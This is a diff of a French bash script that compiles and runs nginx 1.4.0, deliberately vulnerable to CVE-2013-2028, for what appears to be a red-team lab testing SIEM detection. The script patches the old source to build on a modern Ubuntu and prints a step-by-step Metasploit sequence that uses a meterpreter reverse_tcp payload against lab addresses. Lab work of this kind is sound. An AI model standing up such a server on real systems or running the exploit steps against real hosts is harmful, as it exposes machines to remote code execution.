@@ -1,15 +1,16 @@
 #!/bin/bash
 
 ###############################################################################
-# Script d'installation nginx 1.4.0 vulnérable sur port 8080
+# Script d'installation nginx 1.4.0 VULNÉRABLE sur port 8080
 # Projet: Iron4Software Red Team Lab
-# Description: Installe nginx 1.4.0 en parallèle du nginx moderne
+# Patch: sys/sysctl.h pour compatibilité Ubuntu 24.04
 ###############################################################################
 
 set -e  # Arrêt en cas d'erreur
 
 echo "=================================================="
-echo "Installation nginx 1.4.0 vulnérable - Port 8080"
+echo "Installation nginx 1.4.0 VULNÉRABLE - Port 8080"
+echo "Version EXPLOITABLE avec patch Ubuntu 24.04"
 echo "=================================================="
 echo ""
 
@@ -20,13 +21,13 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 # 1. Installation des dépendances
-echo "[1/10] Installation des dépendances..."
+echo "[1/11] Installation des dépendances..."
 apt update -qq
 apt install -y build-essential libpcre3-dev libssl-dev zlib1g-dev wget curl > /dev/null 2>&1
 echo "✅ Dépendances installées"
 
 # 2. Téléchargement de nginx 1.4.0
-echo "[2/10] Téléchargement de nginx 1.4.0..."
+echo "[2/11] Téléchargement de nginx 1.4.0..."
 cd /tmp
 if [ -f "nginx-1.4.0.tar.gz" ]; then
     rm -f nginx-1.4.0.tar.gz
@@ -38,97 +39,203 @@ wget -q http://nginx.org/download/nginx-1.4.0.tar.gz
 tar -xzf nginx-1.4.0.tar.gz
 echo "✅ nginx 1.4.0 téléchargé"
 
-# 3. Compilation de nginx 1.4.0
-echo "[3/10] Compilation de nginx 1.4.0 (cela peut prendre 2-3 minutes)..."
+# 3. PATCH pour Ubuntu 24.04 (kernel 6.x)
+echo "[3/11] Application du patch sys/sysctl.h..."
 cd nginx-1.4.0
+
+# Commenter la ligne #include <sys/sysctl.h> qui n'existe plus
+sed -i 's/^#include <sys\/sysctl.h>/\/\/ #include <sys\/sysctl.h> \/\/ Patched for modern kernel/' src/os/unix/ngx_linux_config.h
+
+# Vérifier que le patch est appliqué
+if grep -q "// #include <sys/sysctl.h>" src/os/unix/ngx_linux_config.h; then
+    echo "✅ Patch appliqué avec succès"
+else
+    echo "❌ Échec du patch"
+    exit 1
+fi
+
+# 4. Configuration
+echo "[4/11] Configuration de nginx 1.4.0..."
 ./configure \
     --prefix=/opt/nginx-vuln \
     --with-http_ssl_module \
     --with-http_stub_status_module \
-    > /dev/null 2>&1
-make > /dev/null 2>&1
-make install > /dev/null 2>&1
-echo "✅ nginx 1.4.0 compilé et installé dans /opt/nginx-vuln"
+    > /tmp/nginx-configure.log 2>&1
 
-# 4. Création du répertoire web
-echo "[4/10] Création du répertoire web..."
+if [ $? -ne 0 ]; then
+    echo "❌ Erreur lors de la configuration"
+    cat /tmp/nginx-configure.log | tail -20
+    exit 1
+fi
+echo "✅ Configuration terminée"
+
+# 5. Compilation
+echo "[5/11] Compilation de nginx 1.4.0 (2-3 minutes)..."
+echo "   ⏳ Compilation en cours, veuillez patienter..."
+
+make > /tmp/nginx-make.log 2>&1 &
+MAKE_PID=$!
+
+# Spinner pendant compilation
+spin='-\|/'
+i=0
+while kill -0 $MAKE_PID 2>/dev/null; do
+    i=$(( (i+1) %4 ))
+    printf "\r   ${spin:$i:1} Compilation... "
+    sleep 0.3
+done
+
+wait $MAKE_PID
+MAKE_EXIT=$?
+
+if [ $MAKE_EXIT -ne 0 ]; then
+    echo ""
+    echo "❌ Erreur lors de la compilation"
+    echo "Dernières lignes du log :"
+    cat /tmp/nginx-make.log | tail -30
+    exit 1
+fi
+
+echo ""
+echo "✅ nginx 1.4.0 compilé avec succès"
+
+# Installation
+make install > /dev/null 2>&1
+echo "✅ nginx 1.4.0 installé dans /opt/nginx-vuln"
+
+# 6. Création du répertoire web
+echo "[6/11] Création du répertoire web..."
 mkdir -p /var/www/vulnerable
 chown -R www-data:www-data /var/www/vulnerable
 echo "✅ Répertoire /var/www/vulnerable créé"
 
-# 5. Création de la page d'index
-echo "[5/10] Création de la page d'index..."
+# 7. Création de la page d'index
+echo "[7/11] Création de la page d'index..."
 cat > /var/www/vulnerable/index.html << 'EOF'
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iron4Software - Test Server</title>
+    <title>Iron4Software - Vulnerable Server</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 800px;
+            max-width: 900px;
             margin: 50px auto;
             padding: 20px;
-            background: #f5f5f5;
+            background: linear-gradient(135deg, #c31432 0%, #240b36 100%);
+            min-height: 100vh;
         }
         .container {
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
         }
         h1 {
-            color: #2c3e50;
-            border-bottom: 3px solid #3498db;
-            padding-bottom: 10px;
+            color: #c31432;
+            border-bottom: 4px solid #c31432;
+            padding-bottom: 15px;
         }
-        .info {
-            background: #ecf0f1;
-            padding: 15px;
-            border-left: 4px solid #3498db;
-            margin: 20px 0;
+        .badge {
+            display: inline-block;
+            padding: 8px 16px;
+            background: #c31432;
+            color: white;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 5px;
         }
-        .warning {
+        .danger {
             background: #ffe6e6;
-            padding: 15px;
-            border-left: 4px solid #e74c3c;
-            margin: 20px 0;
+            padding: 20px;
+            border-left: 5px solid #c31432;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        .vuln {
+            background: #fff3cd;
+            padding: 20px;
+            border-left: 5px solid #ff9800;
+            margin: 25px 0;
+            border-radius: 4px;
         }
         code {
             background: #2c3e50;
             color: #ecf0f1;
-            padding: 2px 6px;
-            border-radius: 3px;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+        }
+        .exploit-list {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Iron4Software - Test Server</h1>
+        <h1>⚠️ Iron4Software - Vulnerable Server</h1>
         
-        <div class="info">
-            <strong>Serveur:</strong> nginx/1.4.0<br>
-            <strong>Port:</strong> 8080<br>
-            <strong>Statut:</strong> ✅ Opérationnel
+        <div>
+            <span class="badge">nginx 1.4.0</span>
+            <span class="badge">VULNERABLE</span>
+            <span class="badge">Port 8080</span>
         </div>
 
-        <div class="warning">
-            ⚠️ <strong>Attention:</strong> Ce serveur est intentionnellement vulnérable pour des tests de sécurité en environnement contrôlé.
+        <div class="danger">
+            <strong>🚨 SERVEUR INTENTIONNELLEMENT VULNÉRABLE</strong><br><br>
+            Ce serveur nginx 1.4.0 contient des vulnérabilités connues et est destiné UNIQUEMENT 
+            à des tests de pénétration en environnement contrôlé.<br><br>
+            <strong>NE JAMAIS exposer sur Internet !</strong>
         </div>
 
-        <h2>Informations</h2>
-        <p>Ce serveur nginx 1.4.0 est configuré pour le projet <strong>Iron4Software Red Team Lab</strong>.</p>
-        
-        <h2>Endpoints disponibles</h2>
+        <h2>🎯 Vulnérabilités présentes</h2>
+        <div class="exploit-list">
+            <strong>CVE-2013-2028</strong> - nginx 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow<br>
+            <em>Permet l'exécution de code à distance (RCE)</em><br><br>
+            
+            <strong>Exploit Metasploit :</strong><br>
+            <code>exploit/linux/http/nginx_chunked_size</code>
+        </div>
+
+        <div class="vuln">
+            <strong>💡 Informations d'exploitation :</strong>
+            <ul>
+                <li><strong>Version vulnérable :</strong> nginx/1.4.0</li>
+                <li><strong>Port d'attaque :</strong> 8080</li>
+                <li><strong>Target :</strong> Ubuntu 13.04 32bit - nginx 1.4.0</li>
+                <li><strong>Payload :</strong> cmd/unix/python/meterpreter/reverse_tcp</li>
+            </ul>
+        </div>
+
+        <h2>📋 Projet Iron4Software</h2>
+        <p>
+            Ce serveur fait partie du <strong>Red Team Lab Iron4Software</strong> pour 
+            tester les capacités de détection du SIEM Splunk et valider les procédures 
+            de réponse aux incidents.
+        </p>
+
+        <h2>🔗 Endpoints</h2>
         <ul>
-            <li><code>/</code> - Page d'accueil</li>
-            <li><code>/status</code> - Statut nginx</li>
+            <li><code>GET /</code> - Page d'accueil</li>
+            <li><code>GET /status</code> - nginx stub_status</li>
         </ul>
 
-        <footer style="margin-top: 40px; text-align: center; color: #7f8c8d; font-size: 0.9em;">
-            Iron4Software Lab Environment - 2026
+        <h2>🛡️ Techniques MITRE ATT&CK</h2>
+        <ul>
+            <li><strong>T1190</strong> - Exploit Public-Facing Application</li>
+            <li><strong>T1068</strong> - Exploitation for Privilege Escalation</li>
+            <li><strong>T1059</strong> - Command and Scripting Interpreter</li>
+        </ul>
+
+        <footer style="margin-top: 50px; text-align: center; color: #7f8c8d; border-top: 1px solid #ecf0f1; padding-top: 20px;">
+            <strong>Iron4Software Lab Environment - 2026</strong><br>
+            <em>Vulnerable by design - Educational purposes only</em>
         </footer>
     </div>
 </body>
@@ -136,8 +243,8 @@ cat > /var/www/vulnerable/index.html << 'EOF'
 EOF
 echo "✅ Page d'index créée"
 
-# 6. Création de la configuration nginx
-echo "[6/10] Création de la configuration nginx..."
+# 8. Création de la configuration nginx
+echo "[8/11] Création de la configuration nginx..."
 cat > /opt/nginx-vuln/conf/nginx.conf << 'EOF'
 user www-data;
 worker_processes 1;
@@ -163,48 +270,42 @@ http {
         server_name mail.iron4software.local localhost;
         
         root /var/www/vulnerable;
-        index index.html index.htm;
+        index index.html;
 
-        # Page d'accueil
         location / {
             try_files $uri $uri/ =404;
         }
 
-        # Status nginx
         location /status {
             stub_status on;
             access_log off;
         }
-
-        # Logs d'accès personnalisés
-        access_log /opt/nginx-vuln/logs/vulnerable-access.log;
-        error_log /opt/nginx-vuln/logs/vulnerable-error.log;
     }
 }
 EOF
 echo "✅ Configuration nginx créée"
 
-# 7. Création des répertoires de logs
-echo "[7/10] Création des répertoires de logs..."
+# 9. Création des logs
+echo "[9/11] Création des répertoires de logs..."
 mkdir -p /opt/nginx-vuln/logs
 chown -R www-data:www-data /opt/nginx-vuln/logs
-echo "✅ Répertoires de logs créés"
+echo "✅ Logs configurés"
 
-# 8. Test de la configuration
-echo "[8/10] Test de la configuration nginx..."
+# 10. Test de la configuration
+echo "[10/11] Test de la configuration..."
 if /opt/nginx-vuln/sbin/nginx -t -c /opt/nginx-vuln/conf/nginx.conf > /dev/null 2>&1; then
-    echo "✅ Configuration nginx valide"
+    echo "✅ Configuration valide"
 else
-    echo "❌ Erreur dans la configuration nginx"
+    echo "❌ Configuration invalide"
     /opt/nginx-vuln/sbin/nginx -t -c /opt/nginx-vuln/conf/nginx.conf
     exit 1
 fi
 
-# 9. Création du service systemd
-echo "[9/10] Création du service systemd..."
+# 11. Service systemd
+echo "[11/11] Création du service systemd..."
 cat > /etc/systemd/system/nginx-vuln.service << 'EOF'
 [Unit]
-Description=nginx 1.4.0 vulnerable instance on port 8080
+Description=nginx 1.4.0 VULNERABLE instance on port 8080
 After=network.target
 
 [Service]
@@ -220,67 +321,69 @@ Restart=on-failure
 [Install]
 WantedBy=multi-user.target
 EOF
-echo "✅ Service systemd créé"
 
-# 10. Activation et démarrage du service
-echo "[10/10] Activation et démarrage du service..."
 systemctl daemon-reload
 systemctl enable nginx-vuln > /dev/null 2>&1
 systemctl start nginx-vuln
 
-# Attendre que le service démarre
 sleep 2
 
 if systemctl is-active --quiet nginx-vuln; then
-    echo "✅ Service nginx-vuln démarré avec succès"
+    echo "✅ Service démarré"
 else
-    echo "❌ Échec du démarrage du service"
-    systemctl status nginx-vuln
+    echo "❌ Échec démarrage"
+    journalctl -u nginx-vuln -n 20 --no-pager
     exit 1
 fi
 
-# Vérification finale
+# Résumé
 echo ""
 echo "=================================================="
-echo "🎉 Installation terminée avec succès !"
+echo "🎉 nginx 1.4.0 VULNÉRABLE installé !"
 echo "=================================================="
 echo ""
 
-# Afficher les informations
-echo "📊 Informations du serveur vulnérable:"
-echo "   Version nginx : $(/opt/nginx-vuln/sbin/nginx -v 2>&1 | cut -d'/' -f2)"
+NGINX_VER=$(/opt/nginx-vuln/sbin/nginx -v 2>&1 | grep -oP 'nginx/\K[0-9.]+')
+SERVER_IP=$(hostname -I | awk '{print $1}')
+
+echo "📊 Serveur vulnérable opérationnel :"
+echo "   Version       : nginx/${NGINX_VER}"
 echo "   Port          : 8080"
-echo "   Document root : /var/www/vulnerable"
-echo "   Logs          : /opt/nginx-vuln/logs/"
+echo "   IP            : ${SERVER_IP}"
+echo "   CVE exploitable : CVE-2013-2028"
 echo ""
 
-echo "🔧 Commandes utiles:"
-echo "   Statut    : sudo systemctl status nginx-vuln"
-echo "   Arrêt     : sudo systemctl stop nginx-vuln"
-echo "   Démarrage : sudo systemctl start nginx-vuln"
-echo "   Restart   : sudo systemctl restart nginx-vuln"
-echo "   Logs      : sudo tail -f /opt/nginx-vuln/logs/error.log"
-echo ""
+# Test
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)
 
-echo "🧪 Tests à effectuer:"
-echo "   Local     : curl -I http://localhost:8080/"
-echo "   Réseau    : curl -I http://$(hostname -I | awk '{print $1}'):8080/"
-echo ""
-
-# Test local automatique
-echo "🧪 Test automatique..."
-if curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ | grep -q "200"; then
-    echo "✅ Le serveur répond correctement sur le port 8080"
+if [ "$HTTP_CODE" = "200" ]; then
+    echo "✅ Serveur accessible (HTTP 200)"
     echo ""
-    echo "📋 Prochaines étapes:"
-    echo "   1. Configurer pfSense pour le Port Forwarding (KALI → 8080)"
-    echo "   2. Tester depuis Kali: curl -I http://192.168.100.254:8080/"
-    echo "   3. Lancer Metasploit exploit nginx_chunked_size"
+    echo "=================================================="
+    echo "🔥 EXPLOITATION AVEC METASPLOIT"
+    echo "=================================================="
+    echo ""
+    echo "1. Configurer pfSense Port Forward :"
+    echo "   Interface: KALI → Port 8080 → ${SERVER_IP}:8080"
+    echo ""
+    echo "2. Depuis Kali :"
+    echo "   curl -I http://192.168.100.254:8080/"
+    echo ""
+    echo "3. Metasploit :"
+    echo "   msfconsole -q"
+    echo "   use exploit/linux/http/nginx_chunked_size"
+    echo "   set RHOSTS 192.168.100.254"
+    echo "   set RPORT 8080"
+    echo "   set LHOST 192.168.100.10"
+    echo "   set LPORT 4444"
+    echo "   set target 4"
+    echo "   check"
+    echo "   exploit"
+    echo ""
 else
-    echo "⚠️  Le serveur ne répond pas comme attendu"
+    echo "❌ Serveur ne répond pas (HTTP ${HTTP_CODE})"
 fi
 
-echo ""
 echo "=================================================="
-echo "🔒 Lab Iron4Software - nginx 1.4.0 vulnérable prêt"
+echo "⚠️  SERVEUR VULNÉRABLE PRÊT POUR EXPLOITATION"
 echo "=================================================="
